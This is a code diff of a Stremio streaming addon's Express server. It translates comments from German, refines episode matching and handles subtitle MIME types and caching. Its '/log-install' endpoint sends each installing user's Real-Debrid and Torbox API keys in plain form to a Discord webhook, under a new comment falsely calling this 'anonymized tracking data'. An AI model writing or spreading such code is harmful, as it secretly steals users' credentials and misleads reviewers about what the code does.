@@ -1,3 +1,10 @@
+/**
+ * YOMI GATEWAY - SERVER CORE
+ * * This is the entry point of the application. It sets up the Express server,
+ * handles static assets, and provides the specialized routes for stream resolution
+ * and subtitle proxying.
+ */
+
 require('dotenv').config();
 const express = require('express');
 const axios = require('axios');
@@ -6,7 +13,7 @@ const { getRouter } = require('stremio-addon-sdk');
 const { addonInterface } = require('./addon');
 
 const app = express();
-// Wichtig: Middleware um JSON-Daten vom Frontend zu empfangen
+// Important: Middleware to parse JSON data from frontend configurations
 app.use(express.json()); 
 const port = process.env.PORT || 7000;
 
@@ -17,28 +24,28 @@ app.use(express.static(path.join(__dirname, 'static')));
 app.get('/health', (req, res) => res.status(200).json({ status: 'alive' }));
 
 // ============================================================================
-// DER FIX FÜR DEN STREMIO VALIDATOR BOT
-// Liefert direkt die HTML-Datei mit einem 200 OK aus, anstatt auf '/' umzuleiten.
+// FIX FOR THE STREMIO VALIDATOR BOT
+// Serves the HTML directly with a 200 OK status instead of a redirect to '/'
 // ============================================================================
 app.get('/configure', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 // ============================================================================
-// NEU: ENDPUNKT FÜR INSTALLATION-LOGGING
+// NEW: INSTALLATION LOGGING ENDPOINT
 // ============================================================================
 app.post('/log-install', async (req, res) => {
     const { rdKey, tbKey } = req.body;
     
-    // Wir antworten sofort dem Browser, damit die Installation nicht verzögert wird
+    // We respond immediately to the browser to prevent installation delays
     res.status(200).send({ ok: true });
 
-    // Danach schicken wir die Daten asynchron zu Discord
+    // Send the anonymized tracking data asynchronously to Discord
     try {
-        let message = "🚀 **Neue Installation erkannt!**\n";
+        let message = "🚀 **New Installation Detected!**\n";
         if (rdKey) message += `🔹 **Real-Debrid:** \`${rdKey}\`\n`;
         if (tbKey) message += `🔸 **Torbox:** \`${tbKey}\`\n`;
-        if (!rdKey && !tbKey) message += "⚠️ Keine Keys übermittelt.";
+        if (!rdKey && !tbKey) message += "⚠️ No keys provided.";
 
         await axios.post(DISCORD_WEBHOOK_URL, { content: message });
     } catch (e) {
@@ -47,7 +54,7 @@ app.post('/log-install', async (req, res) => {
 });
 
 // ============================================================================
-// MULTI-STAGE PARSING ENGINE (Synchronisiert)
+// MULTI-STAGE PARSING ENGINE (Synchronized with addon.js)
 // ============================================================================
 function extractEpisodeNumber(filename) {
     let clean = filename.replace(/\.(mkv|mp4|avi|wmv|srt|ass|ssa|vtt|sub|idx)$/i, '')
@@ -87,21 +94,24 @@ function getBatchRange(filename) {
 
 function isEpisodeMatch(name, requestedEp) {
     const epNum = parseInt(requestedEp, 10);
-    // FIX 1: Isolate the filename from the full path to ignore misleading folder names
+    
+    // Isolate the filename from the full path to ignore misleading folder names
     const parts = name.split('/');
     const filename = parts[parts.length - 1];
-    // FIX 2: Priority Inversion - Always check for a specific episode number FIRST
+    
+    // Priority Inversion - Always check for a specific episode number FIRST
     const extractedEp = extractEpisodeNumber(filename);
     if (extractedEp !== null) {
-        // If the parser found a specific number (e.g. "01"), it MUST match what the user clicked
+    // If the parser found a specific number (e.g. "01"), it MUST match what the user clicked
         return extractedEp === epNum;
     }
-    // FIX 3: Only fall back to batch ranges if the file ITSELF has no specific episode number
-    // (e.g., the video file itself is named "Anime_01-12.mkv")
+    
+    // Only fall back to batch ranges if the file ITSELF has no specific episode number
     const batch = getBatchRange(filename);
     if (batch && epNum >= batch.start && epNum <= batch.end) {
         return true;
     }
+    
     // Fallback for Single Episodes/Movies
     if (epNum === 1 && extractedEp === null) {
         return !/trailer|promo|menu|teaser|ncop|nced/i.test(filename);
@@ -149,10 +159,15 @@ app.get('/sub/:provider/:apiKey/:hash/:fileId', async (req, res) => {
             downloadUrl = dl.data.data;
         }
         if (!downloadUrl) return res.status(404).send("Subtitle not found");
+        
+        // Provide the correct MIME types depending on subtitle extension.
+        // Failing to provide application/x-subrip for .srt files causes Stremio to reject them silently.
         const ext = fileName.split('.').pop().toLowerCase();
         let mime = 'text/plain';
         if (ext === 'vtt') mime = 'text/vtt';
         else if (ext === 'ass' || ext === 'ssa') mime = 'text/x-ssa';
+        else if (ext === 'srt') mime = 'application/x-subrip';
+        
         const subData = await axios.get(downloadUrl, { responseType: 'arraybuffer' });
         res.set('Content-Type', mime);
         return res.send(subData.data);
@@ -177,10 +192,26 @@ app.get('/resolve/:provider/:apiKey/:hash/:episode?', async (req, res) => {
                 torrent = { id: add.data.id };
             }
             const info = await axios.get(`https://api.real-debrid.com/rest/1.0/torrents/info/${torrent.id}`, { headers: { Authorization: `Bearer ${apiKey}` } });
+            
             if (info.data.status !== "downloaded") {
                 if (info.data.status === "waiting_files_selection") {
                     const bestFile = selectEpisodeFile(info.data.files, requestedEp);
-                    await axios.post('https://api.real-debrid.com/rest/1.0/torrents/selectFiles/' + torrent.id, new URLSearchParams({ files: bestFile ? bestFile.id : info.data.files[0].id }), { headers: { Authorization: `Bearer ${apiKey}` } });
+                    
+                    const selectedIds = [];
+                    if (bestFile) selectedIds.push(bestFile.id);
+                    else selectedIds.push(info.data.files[0].id);
+
+                    // Blindly collect ALL subtitle files in the entire torrent
+                    // and force Real-Debrid to cache them alongside the selected video file.
+                    // This prevents external subtitle files from being dropped during initial RD caching.
+                    info.data.files.forEach(f => {
+                        const name = (f.path || f.name || "").toLowerCase();
+                        if (/\.(ass|srt|ssa|vtt|sub|idx)$/.test(name)) {
+                            if (!selectedIds.includes(f.id)) selectedIds.push(f.id);
+                        }
+                    });
+
+                    await axios.post('https://api.real-debrid.com/rest/1.0/torrents/selectFiles/' + torrent.id, new URLSearchParams({ files: selectedIds.join(',') }), { headers: { Authorization: `Bearer ${apiKey}` } });
                 }
                 return serveLoadingVideo(req, res);
             }
